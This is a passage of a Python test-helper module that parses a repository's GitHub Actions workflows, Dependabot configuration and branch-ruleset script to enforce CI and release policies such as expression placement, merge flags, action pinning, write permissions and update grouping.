    level. Everything else -- a ``run:`` body, a step ``name:``, an ``if:``, a
    ``with:`` input -- is reported.

    Args:
        node: The current YAML node, of any type.
        location: Dotted path of ``node`` within the workflow, for messages.
        in_env: Whether an enclosing mapping key was ``env``.

    Returns:
        One ``(location, text, in_env)`` triple per string scalar that
        interpolates an expression.
    """
    if isinstance(node, str):
        return [(location, node, in_env)] if WORKFLOW_EXPRESSION_RE.search(node) else []
    if isinstance(node, dict):
        found: list[tuple[str, str, bool]] = []
        for key, value in node.items():
            child = f"{location}.{key}" if location else str(key)
            # `in_env` marks the *value of* an `env` key. It must not be
            # inherited by sibling keys: a step has both a `run:` and an
            # `env:`, and they are siblings, so the `env:` value is the one
            # safely quoted. Propagating the flag to the whole step would mark
            # the `run:` body as "in env" too, which silently exempts exactly
            # the expression the test exists to catch.
            found.extend(
                _interpolation_sites(value, child, in_env=in_env or key == ENV_KEY)
                if key == ENV_KEY
                else _interpolation_sites(value, child, in_env=in_env)
            )
        return found
    if isinstance(node, list):
        found = []
        for index, value in enumerate(node):
            found.extend(
                _interpolation_sites(value, f"{location}[{index}]", in_env=in_env)
            )
        return found
    return []


def _filter_paths(parsed: object, filter_name: str) -> set[str]:
    """Return the path globs declared for one named ``paths-filter`` filter.

    Args:
        parsed: The decoded ``filters:`` mapping.
        filter_name: The filter whose globs are wanted.

    Returns:
        Every glob declared under ``filter_name``, or an empty set when the
        filter is absent or is not a list of globs.
    """
    if not isinstance(parsed, dict):
        return set()
    globs = parsed.get(filter_name)
    if not isinstance(globs, list):
        return set()
    return {str(glob) for glob in globs}


def _paths_filter_blocks(repo_root: Path) -> list[tuple[str, object]]:
    """Locate every ``dorny/paths-filter`` step and decode its ``filters:``.

    Args:
        repo_root: The repository root.

    Returns:
        One ``(site, parsed)`` pair per path-filter step, where ``site`` names
        the file, job and step and ``parsed`` is the decoded filter mapping.
    """
    blocks: list[tuple[str, object]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        for job_id, job in jobs.items():
            for index, step in enumerate(_job_steps(job)):
                if not str(step.get("uses", "")).startswith(PATHS_FILTER_ACTION):
                    continue
                site = f"{path.relative_to(repo_root)}::{job_id}::step[{index}]"
                with_block = step.get("with")
                assert isinstance(with_block, dict), (
                    f"{site} runs {PATHS_FILTER_ACTION} with no `with:` block, so "
                    "it filters nothing and every downstream job is skipped"
                )
                filters = with_block.get("filters")
                assert isinstance(filters, str), (
                    f"{site} declares a non-string `filters:` value ({filters!r}); "
                    f"{PATHS_FILTER_ACTION} requires a YAML string of filters"
                )
                blocks.append((site, yaml.safe_load(filters)))
    return blocks


def _step_sites(
    data: dict[object, object], path: Path
) -> list[tuple[str, dict[object, object]]]:
    """Return every step of every job in one workflow, paired with its site.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used to build site labels.

    Returns:
        One ``(site, step)`` pair per declared step, where ``site`` reads
        ``<file name>::<job id>::step[<index>]`` so a failure names the exact
        step. The bare file name is enough to disambiguate, and it keeps a
        failure message readable instead of burying the step under an
        absolute path.
    """
    sites: list[tuple[str, dict[object, object]]] = []
    for job_id, job in _workflow_jobs(data, path).items():
        sites.extend(
            (f"{path.name}::{job_id}::step[{index}]", step)
            for index, step in enumerate(_job_steps(job))
        )
    return sites


def _step_uses(step: dict[object, object]) -> str:
    """Return a step's ``uses:`` reference, or an empty string when it has none.

    Args:
        step: A parsed step mapping.

    Returns:
        The right-hand side of ``uses:``, which may be empty for a ``run:`` step.
    """
    value = step.get("uses")
    return value if isinstance(value, str) else ""


def _references_action(reference: str, action: str) -> bool:
    """Report whether a ``uses:`` value names a particular action.

    The reference is compared against the bare action path, so a SHA-pinned
    ``owner/repo@<40-hex>`` and a tag-pinned ``owner/repo@v1`` both match, and
    a different action that merely shares a prefix (``.../upload-sarif`` versus
    ``.../upload-sarif-something``) does not.

    Args:
        reference: The right-hand side of a ``uses:`` line.
        action: The action repository path, without any ``@ref`` suffix.

    Returns:
        True when the reference names exactly that action.
    """
    return reference == action or reference.startswith(f"{action}@")


def _trigger_keys(data: dict[object, object]) -> set[str]:
    """Return the set of event names a workflow declares under ``on:``.

    Args:
        data: A parsed workflow mapping.

    Returns:
        Every declared event name, empty when the workflow has no trigger or
        declares it as a bare sequence rather than a mapping.
    """
    triggers = _trigger_value(data)
    if not isinstance(triggers, dict):
        return set()
    return {str(key) for key in triggers}


def _has_bare_trigger(data: dict[object, object], event: str) -> bool:
    """Report whether a workflow triggers on ``event`` with no filter at all.

    A bare ``pull_request:`` fires on every pull request. A qualified one such
    as ``pull_request: {branches: [main]}`` is filtered, which is the
    distinction the SARIF contract below depends on.

    Args:
        data: A parsed workflow mapping.
        event: The event name to look for.

    Returns:
        True when ``event`` is present and maps to nothing meaningful.
    """
    triggers = _trigger_value(data)
    if not isinstance(triggers, dict):
        return False
    mapping = _as_mapping(triggers, f"the `on:` block, looking for {event!r}")
    if event not in mapping:
        return False
    value = mapping[event]
    return value is None or (isinstance(value, (dict, list)) and not value)


def _publishes_sarif(step: dict[object, object]) -> bool:
    """Report whether a step uploads SARIF to GitHub code scanning.

    Both ``upload-sarif`` and ``analyze`` write findings to the code-scanning
    API; ``analyze`` does so implicitly as its final act, so a workflow using
    only ``analyze`` still overwrites the SARIF baseline of its category.

    Args:
        step: A parsed step mapping.

    Returns:
        True when the step pushes findings into the code-scanning service.
    """
    reference = _step_uses(step)
    return _references_action(reference, CODEQL_UPLOAD_SARIF_ACTION) or (
        _references_action(reference, CODEQL_ANALYZE_ACTION)
    )


def _excludes_pull_request(condition: str) -> bool:
    """Report whether an ``if:`` expression blocks pull-request runs.

    Both halves are required. The event name must appear, so a condition such
    as ``github.event_name == 'schedule'`` cannot be mistaken for a guard, and a
    negation must appear, so a condition that merely *mentions* the event
    positively (``github.event_name == 'pull_request'``) is rejected.

    Args:
        condition: A normalised ``if:`` expression body.

    Returns:
        True when the expression names ``pull_request`` and negates it.
    """
    return PULL_REQUEST_TRIGGER in condition and NEGATION in condition


def _checkout_sites(data: dict[object, object], path: Path) -> list[str]:
    """Return the sites of every ``actions/checkout`` step in one workflow.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in site labels.

    Returns:
        One site label per checkout step, empty when the workflow never checks
        out a working tree.
    """
    return [
        site
        for site, step in _step_sites(data, path)
        if _references_action(_step_uses(step), CHECKOUT_ACTION)
    ]


def _trigger_source_lines(path: Path, events: set[str]) -> dict[str, str]:
    """Return the raw source line each named trigger is declared on.

    Args:
        path: The workflow file to scan.
        events: Trigger names to look for.

    Returns:
        The first raw line per trigger name, which is where a trailing
        ``# ...`` comment would live if one were present.
    """
    found: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        match = TRIGGER_KEY_LINE_RE.match(line)
        if match is None:
            continue
        name = match.group("name")
        if name in events:
            found.setdefault(name, line)
    return found


def _matrix_languages(data: dict[object, object], path: Path) -> set[str]:
    """Collect every ``language`` value declared in a workflow's matrix.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The distinct languages named by any job's ``strategy.matrix.include``
        entries, empty when no job declares such a matrix.
    """
    languages: set[str] = set()
    for job in _workflow_jobs(data, path).values():
        strategy = job.get("strategy")
        if not isinstance(strategy, dict):
            continue
        matrix = strategy.get("matrix")
        if not isinstance(matrix, dict):
            continue
        include = matrix.get("include")
        if not isinstance(include, list):
            continue
        for entry in include:
            if not isinstance(entry, dict):
                continue
            mapping = _as_mapping(entry, f"a `strategy.matrix.include` entry in {path}")
            if "language" in mapping:
                languages.add(str(mapping["language"]))
    return languages


def _init_query_suites(data: dict[object, object], path: Path) -> list[object]:
    """Collect the ``queries:`` value of every ``codeql-action/init`` step.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The raw ``queries`` values, empty when no ``init`` step sets one. An
        unset value is a distinct outcome from a set one, because an unset
        ``queries:`` means CodeQL falls back to its own default suite.
    """
    suites: list[object] = []
    for _site, step in _step_sites(data, path):
        if not _references_action(_step_uses(step), CODEQL_INIT_ACTION):
            continue
        with_block = step.get(WITH_KEY)
        if not isinstance(with_block, dict):
            continue
        mapping = _as_mapping(with_block, f"a `with:` block in {path}")
        if "queries" in mapping:
            suites.append(mapping["queries"])
    return suites


def _auto_merge_workflow(repo_root: Path) -> tuple[Path, dict[object, object]]:
    """Parse the dependabot auto-merge workflow.

    Args:
        repo_root: The repository root.

    Returns:
        The path of the workflow and its parsed top-level mapping.
    """
    path = repo_root / WORKFLOWS_DIR / AUTO_MERGE_WORKFLOW_FILE
    assert path.is_file(), (
        f"required gating file is missing: {path}. The auto-merge policy is what "
        "keeps routine dependency bumps from waiting on a human, and every gate "
        "asserted below is expressed in that file"
    )
    return path, _load_workflow(path)


def _require_job(
    data: dict[object, object], path: Path, job_id: str
) -> dict[object, object]:
    """Return one named job from a workflow, failing if it is absent.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in the failure message.
        job_id: The job id to return.

    Returns:
        The parsed mapping of that job.
    """
    jobs = _workflow_jobs(data, path)
    assert job_id in jobs, (
        f"{path.name} declares no job named {job_id!r} (it declares "
        f"{sorted(jobs)}), so the gate that job is supposed to express is absent "
        "rather than satisfied"
    )
    return jobs[job_id]


def _require_step(job: dict[object, object], name: str) -> dict[object, object]:
    """Return the single step of a job carrying a given ``name:``.

    Args:
        job: A parsed job mapping.
        name: The step name to select.

    Returns:
        The parsed mapping of that step.
    """
    matches = [step for step in _job_steps(job) if step.get("name") == name]
    assert len(matches) == 1, (
        f"expected exactly one step named {name!r} in the auto-merge job, found "
        f"{len(matches)}. The policy asserted below lives in that step, so a "
        "rename or a duplicate would leave the assertion inspecting the wrong "
        "script rather than failing"
    )
    return matches[0]


def _uses_references(path: Path) -> list[tuple[int, str]]:
    """Collect every ``uses:`` reference in a file, at any nesting depth.

    The raw-line form is used rather than the parsed step walk on purpose. A
    ``uses:`` on a job invokes a reusable workflow, and a ``uses:`` on a step
    invokes an action; both execute code from somewhere other than this
    repository, and only the raw-line scan sees the first shape. It also cannot
    be fooled by a ``uses:`` hidden in a key the step walk does not visit.

    Args:
        path: The file to scan.

    Returns:
        One ``(line number, reference)`` pair per ``uses:`` line, in file order.
    """
    found: list[tuple[int, str]] = []
    for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
        match = USES_LINE_RE.match(line)
        if match is not None:
            found.append((number, match.group("reference")))
    return found


def _effective_command(script: str) -> str:
    """Reduce a shell script to the commands it actually executes.

    A shell comment cannot change what a script does, so a run body that merely
    *names* a flag in a comment is not passing that flag to anything. That
    distinction has to be made here rather than by a raw substring search: the
    auto-merge workflow's merge step documents ``--admin`` in a comment precisely
    because it never uses it, and a raw search would either fail against a
    correct file or push the next author into deleting the explanation.

    The body is tokenised with ``shlex``, which also strips quoting, so
    ``gh pr merge "--admin"`` is still detected. A line ``shlex`` cannot tokenise
    (an unbalanced quote, say) falls back to its raw text, which is a superset of
    the tokenised form, so the fallback can only make a check stricter.

    Args:
        script: A ``run:`` body.

    Returns:
        The non-comment lines, requoted and newline-joined.
    """
    commands: list[str] = []
    for line in script.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        try:
            commands.append(" ".join(shlex.split(stripped, comments=True)))
        except ValueError:
            commands.append(stripped)
    return "\n".join(commands)


def _shell_policy_branches(script: str) -> list[ShellBranch]:
    """Split a shell script into its ``if``/``elif``/``else`` branches.

    A branch body is every line indented further than its own ``if``/``elif``/
    ``else`` keyword, which is how a POSIX shell delimits one and is why the
    closing ``fi`` and any following block are not captured. Blank lines are
    kept so indices stay aligned with the source, and a line whose stripped form
    is exactly ``else`` is the only thing treated as the terminal branch, so a
    comment that happens to contain the word cannot be mistaken for one.

    Args:
        script: A ``run:`` body.

    Returns:
        One ``(keyword, condition line, body, keyword line index)`` record per
        branch, in source order.
    """
    lines = script.splitlines()
    branches: list[ShellBranch] = []
    for index, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("if "):
            keyword = "if"
        elif stripped.startswith("elif "):
            keyword = "elif"
        elif stripped == "else":
            keyword = "else"
        else:
            continue
        indent = len(line) - len(line.lstrip())
        body: list[str] = []
        for candidate in lines[index + 1 :]:
            if not candidate.strip():
                body.append("")
                continue
            if len(candidate) - len(candidate.lstrip()) <= indent:
                break
            body.append(candidate)
        branches.append((keyword, stripped, "\n".join(body), index))
    return branches


def _gh_pr_merge_violations(
    repo_root: Path,
) -> tuple[list[str], list[str], list[str]]:
    """Audit every ``gh pr merge`` invocation across all workflows.

    Args:
        repo_root: The repository root.

    Returns:
        A triple of ``(merging steps, merges without ``--auto``, merges using
        ``--admin``)``. The first is the input the other two are computed from,
        and it is returned so the caller can assert the scan reached something.
    """
    merging: list[str] = []
    without_auto: list[str] = []
    with_admin: list[str] = []
    for path in _workflow_paths(repo_root):
        for site, step in _step_sites(_load_workflow(path), path):
            script = step.get(RUN_KEY)
            if not isinstance(script, str):
                continue
            command = _effective_command(script)
            if GH_PR_MERGE not in command:
                continue
            label = f"{site} ({path.relative_to(repo_root)})"
            merging.append(label)
            if GH_MERGE_AUTO_FLAG not in command:
                without_auto.append(label)
            if GH_MERGE_ADMIN_FLAG in command:
                with_admin.append(label)
    return merging, without_auto, with_admin


def _dependabot_entries(path: Path) -> list[dict[object, object]]:
    """Parse the ``updates:`` entries of a Dependabot configuration.

    Args:
        path: The ``.github/dependabot.yml`` to parse.

    Returns:
        Every entry under ``updates:``, typed as a mapping.
    """
    config = _as_mapping(yaml.safe_load(path.read_text(encoding="utf-8")), str(path))
    updates = config.get("updates")
    assert isinstance(updates, list), (
        f"{path.name} declares `updates: {updates!r}`, which is not the list of "
        "ecosystem entries the auto-merge policy reasons about"
    )
    return [
        _as_mapping(entry, f"an `updates:` entry in {path.name}") for entry in updates
    ]


def _entry_value(entry: dict[object, object], *keys: str) -> object:
    """Read a nested Dependabot entry value, tolerating an absent parent.

    Args:
        entry: A parsed ``updates:`` entry.
        keys: The successive mapping keys to descend through.

    Returns:
        The value found, or ``None`` when any key along the way is missing.
    """
    node: object = entry
    for key in keys:
        if not isinstance(node, dict):
            return None
        node = node.get(key)
    return node


def _group_update_types(entry: dict[object, object]) -> dict[str, set[str]]:
    """Map each declared Dependabot group to the update-types it contains.

    Args:
        entry: A parsed ``updates:`` entry.

    Returns:
        ``{group name: {update-type, ...}}`` for every group that declares an
        ``update-types:`` list. A group that declares only ``patterns:`` is
        omitted, because Dependabot's own default for it already spans every
        update-type, so it is exactly the case this contract is about.
    """
    groups = entry.get("groups")
    if not isinstance(groups, dict):
        return {}
    ecosystem = entry.get("package-ecosystem")
    by_group: dict[str, set[str]] = {}
    for name, spec in groups.items():
        mapping = _as_mapping(spec, f"a `groups:` entry of the {ecosystem!r} ecosystem")
        declared = mapping.get("update-types")
        if isinstance(declared, list):
            by_group[str(name)] = {str(value) for value in declared}
    return by_group


def _excluded_ecosystem_problems(branches: list[ShellBranch]) -> list[str]:
    """Report merge-policy branches that mishandle a declared exclusion.

    Two ways to get this wrong, both checked. An ecosystem whose name appears in
    no branch has had its ``elif`` deleted, which routes it into the generic
    semver branch and auto-merges it despite the header claiming otherwise. An
    ecosystem whose branch sets ``eligible=true`` has been folded into the
    eligible class, usually on the reasoning that a patch is safe -- true of
    dependencies, false of ``pre-commit``, where required CI does not run the
    full hook set.

    Args:
        branches: The parsed branches of the merge-policy script.

    Returns:
        One message per violation, empty when every exclusion is intact.
    """
    problems: list[str] = []
    for ecosystem in sorted(EXCLUDED_ECOSYSTEMS):
        hits = [branch for branch in branches if ecosystem in branch[1]]
        if len(hits) != 1:
            problems.append(
                f"{ecosystem!r} appears in the condition of "
                f"{len(hits)} branch(es) {[branch[1] for branch in hits]!r}, "
                "expected exactly one. An ecosystem named by no branch falls "
                "through to the generic semver branch and is auto-merged"
            )
            continue
        if ELIGIBLE_TRUE_RE.search(hits[0][2]):
            problems.append(
                f"the {ecosystem!r} branch {hits[0][1]!r} sets `eligible=true`. "
                "That ecosystem is excluded regardless of update-type, and a "
                "patch is not evidence of coverage for it: for `pre-commit`, "
                "required CI never runs the full hook set"
            )
    return problems


def _cadence_problems(entries: list[dict[object, object]]) -> list[str]:
    """Report Dependabot entries whose schedule or cooldown is wrong.

    Args:
        entries: The parsed ``updates:`` entries.

    Returns:
        One message per violation, empty when every entry is paced as required.
    """
    problems: list[str] = []
    for entry in entries:
        ecosystem = str(entry.get("package-ecosystem"))
        interval = _entry_value(entry, "schedule", "interval")
        if interval != REQUIRED_SCHEDULE_INTERVAL:
            problems.append(
                f"{ecosystem}: schedule.interval is {interval!r}, expected "
                f"{REQUIRED_SCHEDULE_INTERVAL!r}"
            )
        cooldown = _entry_value(entry, "cooldown", "default-days")
        if cooldown != REQUIRED_COOLDOWN_DAYS:
            problems.append(
                f"{ecosystem}: cooldown.default-days is {cooldown!r}, expected "
                f"{REQUIRED_COOLDOWN_DAYS}"
            )
    return problems


def _group_problems(entries: list[dict[object, object]]) -> list[str]:
    """Report Dependabot group definitions that break the auto-merge gate.

    Args:
        entries: The parsed ``updates:`` entries.

    Returns:
        One message per violation, empty when every group splits patch away from
        minor and major while still covering both.
    """
    problems: list[str] = []
    for entry in entries:
        ecosystem = str(entry.get("package-ecosystem"))
        by_group = _group_update_types(entry)
        if not by_group:
            continue
        covered: set[str] = set()
        for types in by_group.values():
            covered |= types
        uncovered = [
            required
            for required in (PATCH_UPDATE_TYPE, MAJOR_UPDATE_TYPE)
            if required not in covered
        ]
        problems.extend(
            f"{ecosystem}: no group declares update-types {required!r} "
            f"(the groups cover {sorted(covered)}). A missing {required!r} means "
            "those updates arrive ungrouped, in whatever roll-up Dependabot "
            "happens to report"
            for required in uncovered
        )
        for group, types in by_group.items():
            mixed = types & {MINOR_UPDATE_TYPE, MAJOR_UPDATE_TYPE}
            if PATCH_UPDATE_TYPE in types and mixed:
                problems.append(
                    f"{ecosystem}: group {group!r} declares update-types "
                    f"{sorted(types)}. The group rolls up to the highest severity "
                    f"it contains, so mixing {PATCH_UPDATE_TYPE!r} with "
                    f"{sorted(mixed)} reports the whole group as {min(mixed)!r} "
                    "and the auto-merge gate rejects an all-patch roll-up"
                )
    return problems


def _cd_workflow(repo_root: Path) -> tuple[Path, dict[object, object]]:
    """Parse the release pipeline, ``cd.yml``.

    Args:
        repo_root: The repository root.

    Returns:
        The path of the workflow and its parsed top-level mapping.
    """
    path = repo_root / WORKFLOWS_DIR / CD_WORKFLOW_FILE
    assert path.is_file(), (
        f"required release pipeline is missing: {path}. The release gate, the "
        "single write token, the three-platform build matrix and the provenance "
        "attestations are all expressed in that file, so without it every one of "
        "them is unverified rather than satisfied"
    )
    return path, _load_workflow(path)


def _job_uses(job: dict[object, object]) -> str:
    """Return a job's ``uses:`` reference, or an empty string when it has none.

    A ``uses:`` on a *job* invokes a reusable workflow; the same key on a *step*
    invokes an action. Only the job-level form can gate a release on CI, so the
    two are read through separate helpers rather than one shared scan that would
    happily accept a step calling something else with the same-looking path.

    Args:
        job: A parsed job mapping.

    Returns:
        The right-hand side of the job's ``uses:``, which is empty for a job
        that declares steps instead.
    """
    value = job.get("uses")
    return value if isinstance(value, str) else ""


def _step_inputs(step: dict[object, object]) -> dict[object, object]:
    """Return a step's ``with:`` inputs, or an empty mapping when it has none.

    An absent block and an empty one are reported identically here, which is
    what callers need: both mean the input was never stated, and a caller that
    requires a specific value must reject both. Only that caller can attach the
    consequence to the omission.

    Args:
        step: A parsed step mapping.

    Returns:
        The step's ``with:`` block, typed as a mapping.
    """
    block = step.get(WITH_KEY)
    if not isinstance(block, dict):
        return {}
    # Same explicit rebuild, and for the same reason, as `_as_mapping`: PyYAML's
    # gradual key and value types otherwise widen on the way out.
    return {  # ruff: ignore[unnecessary-comprehension]
        key: value for key, value in block.items()
    }


def _yaml_true(value: object) -> bool:
    """Report whether a workflow scalar is the boolean ``true``.

    PyYAML resolves the bare scalar ``true`` to ``True``, and a GitHub input
    declared ``type: boolean`` also accepts the string spelling, so both are
    accepted. Everything else is rejected: ``false``, the integer ``1``, the
    empty string, and ``None`` for an input that was never stated. The check is
    deliberately on the value the engine receives rather than on the token that
    produced it, because the token is a spelling and the value is the policy.

    Args:
        value: A parsed YAML scalar.

    Returns:
        True when the value is the boolean true or its string spelling.
    """
    if isinstance(value, bool):
        return value
    return isinstance(value, str) and value.strip().casefold() == "true"


def _scope_writers(jobs: dict[str, dict[object, object]], scope: str) -> dict[str, str]:
    """Map every job granting write access to one scope to the value it declared.

    A job-level ``permissions: write-all`` is recorded as ``write-all`` for
    every scope, because that spelling grants all of them. Treating it as
    anything else would let a job escalate to the whole repository while reading
    as though it had deliberately granted a single scope.

    Args:
        jobs: A workflow's jobs, keyed by job id.
        scope: The permission scope to look for, such as ``contents``.

    Returns:
        ``{job id: declared value}`` for every job granting write on ``scope``,
        empty when no job does.
    """
    writers: dict[str, str] = {}
    for job_id, job in jobs.items():
        declared = job.get("permissions")
        if declared == WRITE_ALL_PERMISSIONS:
            writers[job_id] = WRITE_ALL_PERMISSIONS
        elif isinstance(declared, dict) and declared.get(scope) == PERMISSION_WRITE:
            writers[job_id] = PERMISSION_WRITE
    return writers


def _setup_uv_enable_cache(
    data: dict[object, object], path: Path
) -> list[tuple[str, object]]:
    """Collect the ``enable-cache`` input of every ``setup-uv`` step in a file.

    An input that was never stated is reported as ``None`` rather than skipped,
    because ``None`` is exactly the case the contract refuses: setup-uv's own
    default is ``auto``, so an unstated input hands the behaviour to a default
    that can change under us. A step with no ``with:`` block at all yields
    ``None`` for the same reason.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in site labels.

    Returns:
        One ``(site, value)`` pair per ``setup-uv`` step, in file order.
    """
    found: list[tuple[str, object]] = []
    for site, step in _step_sites(data, path):
        if not _references_action(_step_uses(step), SETUP_UV_ACTION):
            continue
        found.append((site, _step_inputs(step).get(ENABLE_CACHE_KEY)))
    return found


def _matrix_include(
    job: dict[object, object], path: Path, job_id: str
) -> list[dict[object, object]]:
    """Return a job's ``strategy.matrix.include`` entries, asserting they exist.

    ``include`` is the only matrix form that can express a per-entry mapping,
    which is what a release build matrix needs: the artifact name differs per
    platform because Windows requires the ``.exe`` suffix, so an OS list crossed
    with a name list would also produce combinations that do not exist.
    Asserting the key is present is additionally what stops the matrix
    assertions from passing against a job that grew a cross-product instead.

    Args:
        job: A parsed job mapping.
        path: The workflow the job came from, used in failure messages.
        job_id: The job id, used in failure messages.

    Returns:
        Every ``include:`` entry, each typed as a mapping.
    """
    label = f"`strategy.matrix.include` of the {job_id!r} job in {path.name}"
    strategy = _as_mapping(
        job.get("strategy"), f"`strategy:` of {job_id!r} in {path.name}"
    )
    matrix = _as_mapping(
        strategy.get("matrix"), f"`strategy.matrix` of {job_id!r} in {path.name}"
    )
    include = matrix.get("include")
    assert isinstance(include, list), (
        f"{label} is {include!r} ({type(include).__name__}), expected a list of "
        "per-entry mappings. The platform and its artifact name have to be "
        "stated together, because the name is not a function of the OS alone"
    )
    assert include, (
        f"{label} is an empty list, so the {job_id!r} job in {path.name} would "
        "build on nothing and produce no artifact for any platform"
    )
    return [_as_mapping(entry, label) for entry in include]


def _step_scripts(job: dict[object, object]) -> list[tuple[int, str]]:
    """Return every ``run:`` body of a job, paired with its step index.

    The index is what lets a caller prove two behaviours belong to *different*
    steps -- that one step freezes a binary while a separate step runs it --
    which a scan of the concatenated script could not distinguish from a single
    step doing both.

    Args:
        job: A parsed job mapping.

    Returns:
        One ``(step index, run body)`` pair per ``run:`` step, in file order.
    """
    return [
        (index, script)
        for index, step in enumerate(_job_steps(job))
        if isinstance(script := step.get(RUN_KEY), str)
    ]


def _action_input_steps(
    job: dict[object, object], action: str
) -> list[tuple[int, dict[object, object]]]:
    """Return the ``with:`` inputs of every step of a job that uses one action.

    Args:
        job: A parsed job mapping.
        action: The action repository path, without any ``@ref`` suffix.

    Returns:
        One ``(step index, with block)`` pair per matching step, in file order.
        The block is empty rather than absent when the step declares no inputs,
        so a caller comparing one key rejects both spellings.
    """
    return [
        (index, _step_inputs(step))
        for index, step in enumerate(_job_steps(job))
        if _references_action(_step_uses(step), action)
    ]


def _executable_lines(script: str) -> list[str]:
    """Return the non-blank, non-comment lines of a shell script, stripped.

    Unlike ``_effective_command`` this does *not* re-tokenise with ``shlex``,
    because the caller here is matching whole lines literally and a shell test
    line such as ``[ "$2" = success ] && return 0`` only has that exact spelling
    before the quotes are removed. Dropping comments is still required: a line
    that merely names a condition changes nothing, so it must not be able to
    satisfy an assertion about what the function does.

    Args:
        script: A ``run:`` body, or one shell function's worth of one.

    Returns:
        Every line that a shell would act on, left- and right-stripped.
    """
    return [
        stripped
        for line in script.splitlines()
        if (stripped := line.strip()) and not stripped.startswith("#")
    ]


def _shell_function_body(script: str, name: str) -> str:
    """Return the body of one shell function defined in a ``run:`` body.

    A POSIX shell delimits a function body with the first line whose stripped
    form is exactly ``}``, which is how the ``fi`` of an enclosing conditional
    and anything after it are excluded. Locating the function textually rather
    than by parsing is the point: the body is shell, and the assertions about it
    are about characters in a line.

    Args:
        script: A ``run:`` body.
        name: The function's name, without the parameter list.

    Returns:
        The lines between the opening brace and the closing one, joined by
        newlines and without the braces themselves. A function that is opened
        and never closed is a failure, not a body running to the end of the
        script.

    """
    lines = script.splitlines()
    start = next(
        (
            index
            for index, line in enumerate(lines)
            if (match := SHELL_FUNCTION_RE.match(line)) is not None
            and match.group("name") == name
        ),
        None,
    )
    assert start is not None, (
        f"no shell function named {name!r} is defined in the {len(lines)}-line "
        "script (which starts with "
        f"{lines[0].strip()!r}). The policy this function expresses is the "
        "fail-closed mechanism the whole gate rests on, so its absence is the "
        "contract being violated rather than a shape this test has to tolerate"
    )
    remainder = lines[start + 1 :]
    end = next(
        (index for index, line in enumerate(remainder) if line.strip() == "}"),
        None,
    )
    assert end is not None, (
        f"the shell function {name!r} is opened but never closed with a line "
        f"containing only `}}`; the script has {len(lines)} lines and starts "
        f"with {lines[0].strip()!r}. The body would then be everything after it, "
        "including code that has nothing to do with the function, so an "
        "assertion about the body would be asserting about the rest of the "
        "script"
    )
    return "\n".join(remainder[:end])


def _heredoc_body(text: str, delimiter: str) -> str:
    """Return the body of a quoted shell heredoc, with the delimiters removed.

    The payload is read out of the heredoc rather than out of a rendered file
    because the script never writes one: the ruleset is applied over a pipe, and
    a copy written elsewhere could drift from the copy that is actually applied.

    Args:
        text: The whole shell script.
        delimiter: The heredoc delimiter, without the surrounding quotes.

    Returns:
        Every line between the opening line and the terminator, joined by
        newlines. An unterminated heredoc is a failure, not a longer body: the
        rest of the script would otherwise be spliced into the payload.

    """
    lines = text.splitlines()
    start = next(
        (index for index, line in enumerate(lines) if f"<<'{delimiter}'" in line),
        None,
    )
    assert start is not None, (
        f"no <<'{delimiter}' heredoc appears in the {len(lines)}-line script "
        f"(which starts with {lines[0].strip()!r}). The payload asserted below "
        "lives inside that heredoc, so its absence means there is nothing to "
        "assert rather than that the payload is right"
    )
    remainder = lines[start + 1 :]
    end = next(
        (index for index, line in enumerate(remainder) if line.strip() == delimiter),
        None,
    )
    assert end is not None, (
        f"the <<'{delimiter}' heredoc is opened but never terminated by a line "
        f"containing only {delimiter!r}; the script has {len(lines)} lines and "
        f"starts with {lines[0].strip()!r}. Reading to the end of the file would "
        "splice the rest of the script into the payload and make any assertion "
        "about it vacuous"
    )
    return "\n".join(remainder[:end])


def _ruleset_payload(repo_root: Path) -> dict[object, object]:
    """Parse the branch-ruleset payload out of the apply script's heredoc.

    Args:
        repo_root: The repository root.

    Returns:
        The decoded payload, typed as a mapping.
    """
    path = repo_root / RULESET_SCRIPT
    assert path.is_file(), f"required gating file is missing: {path}"
    raw = _heredoc_body(path.read_text(encoding="utf-8"), RULESET_HEREDOC_DELIMITER)
    return _as_mapping(json.loads(raw), f"the ruleset payload in {path.name}")


def _ruleset_required_status_checks(
    payload: dict[object, object],
) -> list[str]:
    """Collect every required status-check context declared by the ruleset.

    Args:
        payload: The decoded ruleset payload.

    Returns:
        One context string per entry of the ``required_status_checks`` rule, in
        declaration order and including duplicates, so that listing the same
        context twice is as visible as listing a second one.
    """
    rules = payload.get("rules")
    assert isinstance(rules, list), (
        f"the ruleset payload declares `rules: {rules!r}` "
        f"({type(rules).__name__}), expected the list of rule objects the "
        f"{RULE_STATUS_CHECK_TYPE!r} rule is one of"
    )
    contexts: list[str] = []
    for rule in rules:
        if not isinstance(rule, dict) or rule.get("type") != RULE_STATUS_CHECK_TYPE:
            continue
        parameters = rule.get("parameters")
        assert isinstance(parameters, dict), (
            f"the {RULE_STATUS_CHECK_TYPE!r} rule declares `parameters: "
            f"{parameters!r}` ({type(parameters).__name__}), so it names no check "
            "and gates nothing"
        )
        declared = parameters.get(RULE_STATUS_CHECK_TYPE)
        assert isinstance(declared, list), (
            f"the {RULE_STATUS_CHECK_TYPE!r} rule declares "
            f"{RULE_STATUS_CHECK_TYPE!r}: {declared!r} "
            f"({type(declared).__name__}), expected the list of required checks"
        )
        contexts.extend(
            str(_as_mapping(entry, "a required-check entry")[CONTEXT_KEY])
            for entry in declared
        )
    return contexts


def _workflow_names(repo_root: Path) -> dict[Path, str]:
    """Map every workflow file to the ``name:`` it declares.

    The name, not the filename, is what a ``workflow_run:`` filter matches
    against, and what the Actions UI shows, so the set of declared names is the
    thing a filter has to be drawn from.

    Args:
        repo_root: The repository root.

    Returns:
        One entry per workflow file, in sorted path order.
    """
    return {
        path: str(_load_workflow(path).get(NAME_KEY, ""))
        for path in _workflow_paths(repo_root)
    }


def _job_display_names(data: dict[object, object], path: Path) -> list[tuple[str, str]]:
